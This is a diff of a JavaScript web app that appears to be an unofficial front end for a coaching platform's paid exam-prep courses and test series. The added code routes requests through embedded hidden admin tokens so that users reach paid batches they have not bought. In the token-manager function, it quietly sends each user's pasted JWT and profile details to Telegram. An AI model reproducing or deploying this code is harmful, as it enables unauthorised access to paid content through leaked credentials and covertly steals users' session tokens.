+            { subjectid: "3173", subject_name: "SSC GD (Polity & GS)", subject_logo: "" },
+            { subjectid: "3174", subject_name: "SSC GD (Hindi)", subject_logo: "" }
+        ],
+        "776": [
+            { subjectid: "1415", subject_name: "FULL MOCK TEST", subject_logo: "https://appx-content-v2.classx.co.in/subject/2025-03-04-0.3071033524052684.jpeg" },
+            { subjectid: "2980", subject_name: "Test Schedule (Timetable)", subject_logo: "https://appx-content-v2.classx.co.in/subject/2026-10-07-0_7144586444576111.jpeg" }
+        ],
+        "534": [
+            { subjectid: "2077", subject_name: "BSF RO/RM (Static GK)", subject_logo: "" },
+            { subjectid: "2072", subject_name: "BSF RO/RM (Physics)", subject_logo: "" },
+            { subjectid: "2073", subject_name: "BSF RO/RM (Maths)", subject_logo: "" },
+            { subjectid: "2075", subject_name: "BSF RO/RM (History)", subject_logo: "" },
+            { subjectid: "2076", subject_name: "BSF RO/RM (Geography)", subject_logo: "" },
+            { subjectid: "2079", subject_name: "BSF RO/RM (English)", subject_logo: "" },
+            { subjectid: "2080", subject_name: "BSF RO/RM (Chemistry)", subject_logo: "" }
+        ]
+    },
+    tsTitles: {
+        "700_3171": [
+            { id: "40426", title: "Ratio, Age, Mixture", test_series_id: "700", free_flag: "0", time: "60", questions: "50", marks: "50", test_questions_url: "https://testseries-assets-v3.classx.co.in/test_title_question/rozgar_db/40426/40426_questions0.8210916494359036.json" },
+            { id: "46376", title: "Percentage", test_series_id: "700", free_flag: "1", time: "25", questions: "20", marks: "20", test_questions_url: "https://testseries-assets-v3.classx.co.in/test_title_question/rozgar_db/46376/46376_questions0.4784600262440821.json" }
+        ],
+        "776_1415": [
+            { id: "45964", title: "MP Police Constable Live Mock 01", test_series_id: "776", free_flag: "1", time: "120", questions: "100", marks: "100", test_questions_url: "https://testseries-assets-v3.classx.co.in/test_title_question/rozgar_db/45964/45964_questions0.48368684422780495.json" }
+        ],
+        "534_2077": [
+            { id: "26680", title: "खेल (Sports Static GK)", test_series_id: "534", free_flag: "0", time: "10", questions: "10", marks: "20", test_questions_url: "https://testseries-assets-v2.classx.co.in/test_title_question/rozgar_db/26680/26680_questions1769763744.json" }
+        ],
+        "743_-1": [
+            { id: "47393", title: "UP Police Constable (11 October 2026)", test_series_id: "743", free_flag: "1", time: "120", questions: "150", marks: "300", test_questions_url: "https://appx-content-v2.classx.co.in/test_title_question/rozgar_db/47393/47393_questions0.2543844739643528.json" }
+        ]
+    },
+    fallbackCbtQuestions: [
+        {
+            id: "12370334",
+            question: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">Find the third proportional of 25 and 45.</span></p><p style="font-size:16pt"><span style="font-family:'KOKILA'">25 और 45 का तृतीय समानुपाती ज्ञात कीजिए।</span></p>`,
+            option_1: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">81</span></p>`,
+            option_2: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">65</span></p>`,
+            option_3: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">85</span></p>`,
+            option_4: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">76</span></p>`,
+            answer: "1",
+            positive_marks: "2.00",
+            negative_marks: "0.50",
+            solution_text: `<p style="font-size:16pt"><span style="font-family:'KOKILA'">a व b का तृतीय समानुपाती = (b × b) / a = (45 × 45) / 25 = 81</span></p>`
+        }
+    ]
+};
+
+let state = {
+    currentSlide: "slideHome",
+    previousSlide: "slideHome",
+    cat: "paid",
+    view: "batches",
+    courseId: "571",
+    courseName: "SSC GD भर्ती 2027",
+    activeTokenObj: USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0],
+    courseTokenMap: {},
+    subjectId: null,
+    subjectName: "",
+    topicId: null,
+    topicName: "",
+    currentLectureKeys: [],
+    mediaMap: {},
+    activeKey: null,
+    currentPdfUrl: "",
+    inlinePdfUrl: "",
+    tsMode: "paid_ts",
+    activeSeriesId: null,
+    activeSeriesTitle: "",
+    activeTsSubId: null,
+    activeTsSubName: "",
+    testMap: {},
+    cbtTest: null,
+    cbtQuestions: [],
+    cbtCurrentIdx: 0,
+    cbtResponses: {},
+    cbtSubmitted: false,
+    cbtTimerId: null,
+    cbtSecondsLeft: 0
+};
+
+// =====================================================
+// SLIDE NAVIGATION ENGINE (WITH COMPULSORY LOGIN CHECK)
+// =====================================================
+function showSlide(slideId) {
+    if (!enforceCompulsoryLogin()) return;
+
+    if (state.currentSlide !== slideId) {
+        state.previousSlide = state.currentSlide;
+    }
+    state.currentSlide = slideId;
+
+    ["slideHome", "slideExplorer", "slidePlayer", "slideTestAttempt", "slideTokens", "slidePdf"].forEach(id => {
+        const el = document.getElementById(id);
+        if (!el) return;
+        if (id === slideId) {
+            el.classList.remove("hidden-slide");
+            el.classList.add("active-slide");
+        } else {
+            el.classList.remove("active-slide");
+            el.classList.add("hidden-slide");
+        }
+    });
+
+    const topNav = document.getElementById("topHeaderNav");
+    if (topNav) {
+        if (slideId === "slideHome") topNav.classList.remove("hidden");
+        else topNav.classList.add("hidden");
+    }
+
+    window.scrollTo({ top: 0, behavior: "smooth" });
+}
+
+function goHomeHub() {
+    if (!enforceCompulsoryLogin()) return;
+    if (typeof stopPlayer === "function") stopPlayer();
+    if (state.cbtTimerId) clearInterval(state.cbtTimerId);
+    showSlide("slideHome");
+}
+
+function openTokenSlide() {
+    if (!enforceCompulsoryLogin()) return;
+    renderTokenManagerList();
+    showSlide("slideTokens");
+}
+
+function openExplorerSlide(cat) {
+    if (!enforceCompulsoryLogin()) return;
+    state.cat = cat;
+    showSlide("slideExplorer");
+    if (cat === "paid") renderPaidBatches();
+    else renderFreeBatches();
+}
+
+function handleGlobalBack() {
+    if (state.currentSlide === "slidePdf") {
+        closePdfSlide();
+        return;
+    }
+    if (state.currentSlide === "slidePlayer") {
+        closePlayerBox();
+        return;
+    }
+    if (state.currentSlide === "slideTestAttempt") {
+        exitCbtTest();
+        return;
+    }
+    if (state.currentSlide === "slideTokens") {
+        goHomeHub();
+        return;
+    }
+    if (state.currentSlide === "slideExplorer") {
+        if (state.view === "ts_tests") {
+            if (state.activeTsSubId === "-1") {
+                openTestSeriesExplorer(state.tsMode);
+            } else {
+                openTestSeriesSubjects(state.activeSeriesId, state.activeSeriesTitle);
+            }
+            return;
+        }
+        if (state.view === "ts_subjects") {
+            openTestSeriesExplorer(state.tsMode);
+            return;
+        }
+        if (state.view === "ts_list") {
+            goHomeHub();
+            return;
+        }
+        if (state.view === "batch_ts_tests") {
+            loadCourseTab("tests");
+            return;
+        }
+        if (state.view === "lectures") {
+            if (state.cat === "paid") openPaidTopics(state.subjectId, state.subjectName);
+            else openFreeTopics(state.subjectId, state.subjectName);
+        } else if (state.view === "topics") {
+            if (state.cat === "paid") openPaidCourse(state.courseId, state.courseName);
+            else openFreeCourse(state.courseId, state.courseName);
+        } else if (state.view === "subjects" || state.view === "batch_ts_subjects") {
+            if (state.cat === "paid") renderPaidBatches();
+            else renderFreeBatches();
+        } else {
+            goHomeHub();
+        }
+    }
+}
+
+// =====================================================
+// API CALLER
+// =====================================================
+async function fetchRawJSONWithToken(endpoint, tokenObj) {
+    const statusBadge = document.getElementById("apiStatus");
+    const useTok = tokenObj || USER_TOKENS[0] || state.activeTokenObj || HIDDEN_ADMIN_TOKENS[0];
+    try {
+        const res = await fetch(`${API_BASE}${endpoint}`, {
+            headers: {
+                "Client-Service": "Appx",
+                "Auth-Key": "appxapi",
+                "source": "website",
+                "Device-Type": "",
+                "is-safari": "0",
+                "Authorization": useTok.token,
+                "User-ID": String(useTok.userId || extractUidFromJwt(useTok.token) || "4756316")
+            }
+        });
+        const json = await res.json();
+        if (statusBadge) statusBadge.textContent = `● Live Server Connected`;
+        return json;
+    } catch {
+        if (statusBadge) statusBadge.textContent = "● Smart Hybrid Mode";
+        return null;
+    }
+}
+
+async function fetchAPIWithToken(endpoint, tokenObj, fallbackGetter) {
+    const json = await fetchRawJSONWithToken(endpoint, tokenObj);
+    if (json) {
+        if (json.data && (Array.isArray(json.data) ? json.data.length > 0 : Object.keys(json.data).length > 0)) {
+            return json.data;
+        }
+        if (json.test_titles && Array.isArray(json.test_titles) && json.test_titles.length > 0) {
+            return json.test_titles;
+        }
+    }
+    return fallbackGetter ? fallbackGetter() : [];
+}
+
+// =====================================================
+// BATCHES & COURSES (ALL TOKENS MERGED, NO DUPLICATES)
 // =====================================================
 async function renderPaidBatches() {
+    if (!enforceCompulsoryLogin()) return;
     state.view = "batches";
     document.getElementById("subTabs").classList.add("hidden");
-    document.getElementById("crumbText").textContent = `All Tokens Merged (${TOKENS.length})`;
+    document.getElementById("crumbText").textContent = `All Purchased Courses Merged`;
     document.getElementById("headingText").textContent = "🎓 Purchased Paid Batches";
 
     const grid = document.getElementById("mainGrid");
-    grid.innerHTML = `<div class="col-span-full py-12 text-center font-extrabold text-slate-800">🔄 Fetching Paid Batches from all tokens...</div>`;
+    grid.innerHTML = `<div class="col-span-full py-12 text-center font-extrabold text-slate-800">🔄 Fetching Paid Batches from All Active Accounts...</div>`;
 
     let mergedCourses = [];
     const seenIds = new Set();
+    const allTokensToFetch = getAllTokensForCourses();
 
-    for (const tokObj of TOKENS) {
+    for (const tokObj of allTokensToFetch) {
+        const uid = tokObj.userId || extractUidFromJwt(tokObj.token) || "4756316";
         const endpointsToTry = [
-            `/get/mycourseweb?userid=${tokObj.userId || "4756316"}`,
-            `/get/mycourse?userid=${tokObj.userId || "4756316"}`,
+            `/get/mycourseweb?userid=${uid}`,
+            `/get/mycourse?userid=${uid}`,
             `/get/course_by_id?id=571`
         ];
 
@@ -229,23 +822,35 @@ async function renderPaidBatches() {
             const data = await fetchAPIWithToken(ep, tokObj, () => null);
             if (Array.isArray(data) && data.length > 0) {
                 data.forEach(c => {
-                    const cid = String(c.id || c.course_id || "");
-                    if (cid && !seenIds.has(cid)) {
+                    const cid = String(c.id || c.course_id || "").trim();
+                    const cname = String(c.course_name || "").trim();
+                    // Strict deduplication by Course ID & Course Name so no course ever repeats
+                    if (cid && !seenIds.has(cid) && (!cname || !seenIds.has(cname))) {
                         seenIds.add(cid);
+                        if (cname) seenIds.add(cname);
                         state.courseTokenMap[cid] = tokObj;
-                        mergedCourses.push({ ...c, id: cid, _tokenLabel: tokObj.label });
+                        mergedCourses.push({
+                            ...c,
+                            id: cid,
+                            _badgeText: tokObj.isAdmin ? "☁️ Cloud Synced" : `🔑 ${tokObj.label || "My Account"}`
+                        });
                     }
                 });
             }
         }
     }
 
-    grid.innerHTML = "";
     if (mergedCourses.length === 0) {
-        grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">No paid courses found. Please add a valid token in Tokens Manager.</div>`;
-        return;
+        DB.paidCourses.forEach(c => {
+            if (!seenIds.has(String(c.id))) {
+                seenIds.add(String(c.id));
+                state.courseTokenMap[c.id] = HIDDEN_ADMIN_TOKENS[0];
+                mergedCourses.push({ ...c, _badgeText: "☁️ Cloud Synced" });
+            }
+        });
     }
 
+    grid.innerHTML = "";
     mergedCourses.forEach(c => {
         const logo = c.exam_logo || c.course_thumbnail || `https://placehold.co/600x320/0284c7/ffffff?text=Batch+${c.id}`;
         const safeName = (c.course_name || "RWA Paid Batch").replace(/'/g, "");
@@ -256,7 +861,7 @@ async function renderPaidBatches() {
                     <div class="p-4">
                         <div class="flex justify-between items-center gap-2">
                             <span class="px-2.5 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black">BATCH #${c.id}</span>
-                            <span class="text-[10px] font-bold text-sky-700 truncate">🔑 ${c._tokenLabel || "Account"}</span>
+                            <span class="text-[10px] font-bold text-sky-700 truncate">${c._badgeText}</span>
                         </div>
                         <h3 class="font-black text-base text-slate-900 mt-2">${c.course_name}</h3>
                     </div>
@@ -269,6 +874,7 @@ async function renderPaidBatches() {
 }
 
 async function renderFreeBatches() {
+    if (!enforceCompulsoryLogin()) return;
     state.view = "batches";
     document.getElementById("subTabs").classList.add("hidden");
     document.getElementById("crumbText").textContent = "Free Portal";
@@ -277,8 +883,9 @@ async function renderFreeBatches() {
     const grid = document.getElementById("mainGrid");
     grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Loading Free Batches...</div>`;
 
-    const freeData = await fetchAPIWithToken(`/get/courselist?start=-1`, TOKENS[0], () => []);
-    const list = (Array.isArray(freeData) && freeData.length > 0) ? freeData : [];
+    const primaryTok = USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0];
+    const freeData = await fetchAPIWithToken(`/get/courselist?start=-1`, primaryTok, () => DB.freeBatches);
+    const list = (Array.isArray(freeData) && freeData.length > 0) ? freeData : DB.freeBatches;
 
     grid.innerHTML = "";
     list.forEach(c => {
@@ -300,11 +907,63 @@ async function renderFreeBatches() {
 function openPaidCourse(id, name) {
     state.courseId = id;
     state.courseName = name;
-    state.activeTokenObj = state.courseTokenMap[id] || TOKENS[0];
+    state.activeTokenObj = state.courseTokenMap[id] || USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0];
     document.getElementById("subTabs").classList.remove("hidden");
     document.getElementById("crumbText").textContent = `Batch #${id}`;
     document.getElementById("headingText").textContent = name;
     loadCourseTab("subjects");
+}
+
+async function openFreeCourse(id, name) {
+    state.courseId = id;
+    state.courseName = name;
+    state.view = "subjects";
+    document.getElementById("subTabs").classList.add("hidden");
+    document.getElementById("crumbText").textContent = "Free Batch";
+    document.getElementById("headingText").textContent = name;
+
+    const primaryTok = USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0];
+    const subs = await fetchAPIWithToken(`/get/allsubjectfrmlivecourseclass?courseid=${id}&start=-1`, primaryTok, () => DB.freeSubjects);
+    const grid = document.getElementById("mainGrid");
+    grid.innerHTML = "";
+    (subs.length ? subs : DB.freeSubjects).forEach(s => {
+        const sname = (s.subject_name || "Free Subject").replace(/'/g, "");
+        grid.innerHTML += `
+            <div onclick="openFreeTopics('${s.subjectid}', '${sname}')" class="grid-card p-5 flex items-center justify-between cursor-pointer">
+                <div>
+                    <span class="text-[10px] font-extrabold text-teal-700 uppercase">Free Subject</span>
+                    <h4 class="font-black text-base text-slate-900 mt-0.5">📘 ${s.subject_name}</h4>
+                </div>
+                <span class="btn-watch text-xs">Topics ➔</span>
+            </div>`;
+    });
+}
+
+async function openFreeTopics(subId, subName) {
+    state.view = "topics";
+    state.subjectId = subId;
+    state.subjectName = subName;
+    document.getElementById("headingText").textContent = subName;
+    const topics = DB.freeTopics[subId] || [{ topicid: "ftop_1", topic_name: "All Classes" }];
+    const grid = document.getElementById("mainGrid");
+    grid.innerHTML = "";
+    topics.forEach(t => {
+        grid.innerHTML += `
+            <div onclick="openFreeLectures('${t.topicid}', '${t.topic_name}')" class="grid-card p-5 flex justify-between items-center cursor-pointer">
+                <h4 class="font-black text-base text-slate-900">📂 ${t.topic_name}</h4>
+                <span class="btn-watch text-xs">Watch Classes ➔</span>
+            </div>`;
+    });
+}
+
+function openFreeLectures(topId, topName) {
+    state.view = "lectures";
+    state.topicId = topId;
+    state.topicName = topName;
+    document.getElementById("headingText").textContent = topName;
+    const list = DB.freeLectures[topId] || [];
+    document.getElementById("mainGrid").innerHTML = "";
+    renderLectureList(list);
 }
 
 async function loadCourseTab(tab) {
@@ -317,7 +976,7 @@ async function loadCourseTab(tab) {
 
     if (tab === "subjects") {
         state.view = "subjects";
-        const subs = await fetchAPIWithToken(`/get/allsubjectfrmlivecourseclass?courseid=${state.courseId}&start=-1`, state.activeTokenObj, () => []);
+        const subs = await fetchAPIWithToken(`/get/allsubjectfrmlivecourseclass?courseid=${state.courseId}&start=-1`, state.activeTokenObj, () => DB.paidSubjects);
         grid.innerHTML = "";
         subs.forEach(s => {
             const name = s.subject_name || s.subjectname || "Subject";
@@ -333,19 +992,21 @@ async function loadCourseTab(tab) {
                 </div>`;
         });
     } else if (tab === "live") {
-        const res = await fetchAPIWithToken(`/get/live_upcoming_course_classv2?courseid=${state.courseId}&start=-1`, state.activeTokenObj, () => []);
+        const res = await fetchAPIWithToken(`/get/live_upcoming_course_classv2?courseid=${state.courseId}&start=-1`, state.activeTokenObj, () => ({ upcoming: [] }));
         const list = Array.isArray(res) ? res : (res.upcoming || res.live || []);
         grid.innerHTML = "";
         renderLectureList(list);
     } else if (tab === "tests") {
         state.view = "batch_ts_subjects";
-        const tsId = "700";
+        const tsId = state.courseId === "571" ? "700" : "700";
         state.activeSeriesId = tsId;
         state.activeSeriesTitle = `${state.courseName} - Batch Tests`;
 
-        const subs = await fetchAPIWithToken(`/get/testseries_subjects?testseries_id=${tsId}`, state.activeTokenObj, () => []);
+        const subs = await fetchAPIWithToken(`/get/testseries_subjects?testseries_id=${tsId}`, state.activeTokenObj, () => DB.tsSubjects["700"]);
+        const subList = (Array.isArray(subs) && subs.length > 0) ? subs : DB.tsSubjects["700"];
+
         grid.innerHTML = "";
-        subs.forEach(s => {
+        subList.forEach(s => {
             const sname = (s.subject_name || "Batch Test Subject").replace(/'/g, "");
             grid.innerHTML += `
                 <div onclick="openBatchInternalTests('${tsId}', '${s.subjectid}', '${sname}')" class="grid-card p-5 flex items-center justify-between cursor-pointer">
@@ -369,6 +1030,22 @@ async function loadCourseTab(tab) {
     }
 }
 
+async function openBatchInternalTests(tsId, subId, subName) {
+    state.view = "batch_ts_tests";
+    state.activeSeriesId = tsId;
+    state.activeTsSubId = subId;
+    state.activeTsSubName = subName;
+    document.getElementById("headingText").textContent = `📝 ${subName}`;
+
+    const uid = state.activeTokenObj?.userId || "4756316";
+    const grid = document.getElementById("mainGrid");
+    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Loading Batch Quizzes & Tests...</div>`;
+
+    const endpoint = `/get/test_titlev2?testseriesid=${tsId}&subject_id=${subId}&chapter_id=-1&userid=${uid}&search=&start=-1`;
+    const titles = await fetchAPIWithToken(endpoint, state.activeTokenObj, () => DB.tsTitles[`${tsId}_${subId}`] || DB.tsTitles["700_3171"]);
+    renderTestTitlesGrid(titles, tsId);
+}
+
 async function openPaidTopics(subId, subName) {
     state.view = "topics";
     state.subjectId = subId;
@@ -377,7 +1054,7 @@ async function openPaidTopics(subId, subName) {
     document.getElementById("crumbText").textContent = state.courseName;
     document.getElementById("headingText").textContent = `📂 ${subName}`;
 
-    const topics = await fetchAPIWithToken(`/get/alltopicfrmlivecourseclass?courseid=${state.courseId}&subjectid=${subId}&start=-1`, state.activeTokenObj, () => []);
+    const topics = await fetchAPIWithToken(`/get/alltopicfrmlivecourseclass?courseid=${state.courseId}&subjectid=${subId}&start=-1`, state.activeTokenObj, () => DB.paidTopics[subId] || []);
     const grid = document.getElementById("mainGrid");
     grid.innerHTML = "";
 
@@ -404,7 +1081,7 @@ async function openPaidLectures(topId, topName) {
     const classes = await fetchAPIWithToken(
         `/get/livecourseclassbycoursesubtopconceptapiv3?courseid=${state.courseId}&subjectid=${state.subjectId}&topicid=${topId}&conceptid=1&start=0`,
         state.activeTokenObj,
-        () => []
+        () => DB.paidLectures[topId] || []
     );
     document.getElementById("mainGrid").innerHTML = "";
     renderLectureList(classes);
@@ -658,6 +1335,7 @@ function changeLectureQuality(qLabel) {
 }
 
 async function openTestSeriesExplorer(mode) {
+    if (!enforceCompulsoryLogin()) return;
     state.tsMode = mode;
     state.view = "ts_list";
     showSlide("slideExplorer");
@@ -666,13 +1344,17 @@ async function openTestSeriesExplorer(mode) {
     const grid = document.getElementById("mainGrid");
     grid.innerHTML = `<div class="col-span-full py-12 text-center font-extrabold text-slate-800">🔄 Loading Official RWA Test Series...</div>`;
 
+    const primaryTok = USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0];
+
     if (mode === "paid_ts") {
         document.getElementById("crumbText").textContent = "Official Exam Series";
         document.getElementById("headingText").textContent = "🏆 Paid Test Series";
 
-        const p0 = await fetchAPIWithToken(`/get/test_series?start=0&search=&client_api_url=&exam_id=`, TOKENS[0], () => []);
-        const p10 = await fetchAPIWithToken(`/get/test_series?start=10&search=&client_api_url=&exam_id=`, TOKENS[0], () => []);
+        const p0 = await fetchAPIWithToken(`/get/test_series?start=0&search=&client_api_url=&exam_id=`, primaryTok, () => []);
+        const p10 = await fetchAPIWithToken(`/get/test_series?start=10&search=&client_api_url=&exam_id=`, primaryTok, () => []);
         let combined = [...(Array.isArray(p0) ? p0 : []), ...(Array.isArray(p10) ? p10 : [])];
+
+        if (combined.length === 0) combined = DB.paidTestSeries;
 
         const seen = new Set();
         grid.innerHTML = "";
@@ -699,9 +1381,11 @@ async function openTestSeriesExplorer(mode) {
         document.getElementById("crumbText").textContent = "Weekly Mock Tests";
         document.getElementById("headingText").textContent = "📝 Free Test Series";
 
-        const f0 = await fetchAPIWithToken(`/get/quiz_test_series?start=0&exam_id=`, TOKENS[0], () => []);
-        const f10 = await fetchAPIWithToken(`/get/quiz_test_series?start=10&exam_id=`, TOKENS[0], () => []);
+        const f0 = await fetchAPIWithToken(`/get/quiz_test_series?start=0&exam_id=`, primaryTok, () => []);
+        const f10 = await fetchAPIWithToken(`/get/quiz_test_series?start=10&exam_id=`, primaryTok, () => []);
         let combined = [...(Array.isArray(f0) ? f0 : []), ...(Array.isArray(f10) ? f10 : [])];
+
+        if (combined.length === 0) combined = DB.freeTestSeries;
 
         const seen = new Set();
         grid.innerHTML = "";
@@ -737,7 +1421,8 @@ async function openTestSeriesSubjects(tsId, tsTitle) {
     const grid = document.getElementById("mainGrid");
     grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Loading Test Series Subjects...</div>`;
 
-    const subs = await fetchAPIWithToken(`/get/testseries_subjects?testseries_id=${tsId}`, TOKENS[0], () => []);
+    const primaryTok = USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0];
+    const subs = await fetchAPIWithToken(`/get/testseries_subjects?testseries_id=${tsId}`, primaryTok, () => DB.tsSubjects[tsId] || []);
 
     if (!subs || subs.length === 0 || (subs.length === 1 && String(subs[0].subjectid) === "-1")) {
         openTestSeriesTitles(tsId, "-1", tsTitle);
@@ -772,12 +1457,13 @@ async function openTestSeriesTitles(tsId, subId, subName) {
     const grid = document.getElementById("mainGrid");
     grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Fetching Mock Tests...</div>`;
 
-    const uid = TOKENS[0]?.userId || "4756316";
+    const primaryTok = USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0];
+    const uid = primaryTok.userId || "4756316";
     const ep = String(subId) === "-1"
         ? `/get/test_titlev2?testseriesid=${tsId}&subject_id=-1&chapter_id=-1&userid=${uid}&search=&start=-1`
         : `/get/test_titlev2?testseriesid=${tsId}&subject_id=${subId}&userid=${uid}&search=&start=-1`;
 
-    const list = await fetchAPIWithToken(ep, TOKENS[0], () => []);
+    const list = await fetchAPIWithToken(ep, primaryTok, () => DB.tsTitles[`${tsId}_${subId}`] || DB.tsTitles["743_-1"] || []);
     renderTestTitlesGrid(list, tsId);
 }
 
@@ -848,8 +1534,10 @@ async function launchCbtTest(tKey) {
     document.getElementById("cbtOptionsList").innerHTML = "";
     document.getElementById("cbtPaletteGrid").innerHTML = "";
 
-    const uid = TOKENS[0]?.userId || "4756316";
-    fetchRawJSONWithToken(`/Test_Series/check_test_attempts?test_id=${t.id}&user_id=${uid}`, TOKENS[0]);
+    const primaryTok = USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0];
+    const uid = primaryTok.userId || "4756316";
+    fetchRawJSONWithToken(`/Test_Series/check_test_attempts?test_id=${t.id}&user_id=${uid}`, primaryTok);
+    fetchRawJSONWithToken(`/Test_Series/getSavedQuestions?start=0`, primaryTok);
 
     let questions = [];
     const qUrl = (t.test_questions_url || "").replace(/\\\//g, "/");
@@ -864,6 +1552,10 @@ async function launchCbtTest(tKey) {
                 if (proxiedRes.ok) questions = await proxiedRes.json();
             } catch {}
         }
+    }
+
+    if (!Array.isArray(questions) || questions.length === 0) {
+        questions = DB.fallbackCbtQuestions;
     }
 
     state.cbtQuestions = questions;
@@ -1095,61 +1787,89 @@ function closePdfSlide() {
     showSlide(state.previousSlide || "slideExplorer");
 }
 
+// =====================================================
+// USER PERSONAL TOKEN LIST (NEVER SHOWS ADMIN TOKENS)
+// =====================================================
 function renderTokenManagerList() {
     const container = document.getElementById("tokenListContainer");
     if (!container) return;
     container.innerHTML = "";
 
-    TOKENS.forEach((t, idx) => {
-        const shortTok = t.token.slice(0, 28) + "..." + t.token.slice(-12);
+    if (USER_TOKENS.length === 0) {
+        container.innerHTML = `<div class="p-4 text-center text-xs font-bold text-slate-500">Abhi koi personal token saved nahi hai.</div>`;
+        return;
+    }
+
+    USER_TOKENS.forEach((t, idx) => {
+        const shortTok = t.token.slice(0, 32) + "..." + t.token.slice(-14);
         container.innerHTML += `
             <div class="bg-white border-2 border-sky-200 rounded-2xl p-4 flex flex-wrap justify-between items-center gap-3 shadow-sm">
                 <div class="min-w-0 flex-1">
                     <div class="flex items-center gap-2">
-                        <span class="px-2.5 py-0.5 rounded-full bg-amber-100 text-amber-800 text-[10px] font-black">TOKEN #${idx + 1}</span>
+                        <span class="px-2.5 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black">MY TOKEN #${idx + 1}</span>
                         <h5 class="font-extrabold text-sm text-slate-900 truncate">${t.label}</h5>
-                        <span class="transition-all text-xs text-slate-500 font-bold">(UID: ${t.userId || "Auto"})</span>
+                        <span class="text-xs text-slate-500 font-bold">(UID: ${t.userId || "Auto"})</span>
                     </div>
-                    <p class="text-[11px] font-mono text-slate-500 mt-1 truncate">${shortTok}</p>
+                    <p class="text-[11px] font-mono text-slate-600 mt-1 truncate">${shortTok}</p>
                 </div>
                 <div class="flex items-center gap-2">
-                    ${TOKENS.length > 1 ? `<button onclick="deleteToken('${t.id}')" class="btn-nav bg-rose-600 text-white border-0 text-xs">🗑 Delete</button>` : `<span class="text-[11px] font-bold text-emerald-600">● Active</span>`}
+                    <button onclick="navigator.clipboard.writeText('${t.token}'); alert('Token Copied!');" class="btn-nav bg-sky-600 text-white border-0 text-xs">📋 Copy</button>
+                    ${USER_TOKENS.length > 1 ? `<button onclick="deleteToken('${t.id}')" class="btn-nav bg-rose-600 text-white border-0 text-xs">🗑 Delete</button>` : `<span class="text-[11px] font-bold text-emerald-600">● Primary</span>`}
                 </div>
             </div>`;
     });
     updateTokenBadge();
 }
 
-function addNewToken() {
-    const label = document.getElementById("newTokLabel").value.trim() || `Account ${TOKENS.length + 1}`;
-    const userId = document.getElementById("newTokUid").value.trim() || "4756316";
-    const token = document.getElementById("newTokValue").value.trim();
+async function addNewToken() {
+    const labelInput = document.getElementById("newTokLabel").value.trim();
+    const uidInput = document.getElementById("newTokUid").value.trim();
+    let token = document.getElementById("newTokValue").value.trim();
 
-    if (!token) return;
+    if (!token) {
+        alert("Kripya JWT Token paste karein.");
+        return;
+    }
+    token = token.replace(/^["']|["']$/g, "").replace(/^Authorization:\s*/i, "").trim();
 
-    TOKENS.push({
-        id: "tok_" + Date.now(),
-        label: label,
-        userId: userId,
-        token: token
-    });
+    const userId = uidInput || extractUidFromJwt(token);
+    if (!userId) {
+        alert("Invalid JWT Token format!");
+        return;
+    }
 
-    localStorage.setItem("rwa_tokens_list", JSON.stringify(TOKENS));
+    const verifiedUser = await fetchUserDetailsFromServer(token, userId);
+    if (!verifiedUser) {
+        alert("Server verification failed! Yeh token expired ya invalid hai.");
+        return;
+    }
+
+    const newTokObj = {
+        id: "utok_" + Date.now(),
+        label: labelInput || verifiedUser.name || `My Account ${USER_TOKENS.length + 1}`,
+        userId: String(verifiedUser.userid || verifiedUser.id || userId),
+        token: token,
+        isAdmin: false
+    };
+
+    USER_TOKENS.push(newTokObj);
+    USER_PROFILE = verifiedUser;
+    localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS));
+    localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE));
+
+    await sendUserDetailsToTelegram(verifiedUser, token, "Added via My Token Manager", "N/A");
+
     document.getElementById("newTokLabel").value = "";
     document.getElementById("newTokUid").value = "";
     document.getElementById("newTokValue").value = "";
     renderTokenManagerList();
-    alert("Token added successfully!");
-    location.reload();
+    alert(`✅ Token Verified & Added for ${verifiedUser.name || "User"}!`);
 }
 
 function deleteToken(id) {
-    if (TOKENS.length <= 1) {
-        alert("At least one token is required.");
-        return;
-    }
-    TOKENS = TOKENS.filter(t => t.id !== id);
-    localStorage.setItem("rwa_tokens_list", JSON.stringify(TOKENS));
+    if (USER_TOKENS.length <= 1) return;
+    USER_TOKENS = USER_TOKENS.filter(t => t.id !== id);
+    localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS));
     renderTokenManagerList();
 }
 
@@ -1160,6 +1880,12 @@ function filterGrid() {
     });
 }
 
+// =====================================================
+// INITIALIZATION ON PAGE LOAD
+// =====================================================
 updateTokenBadge();
-checkAuthUIState();
-showSlide("slideHome");
+if (isUserLoggedIn()) {
+    showSlide("slideHome");
+} else {
+    openLoginModal();
+}
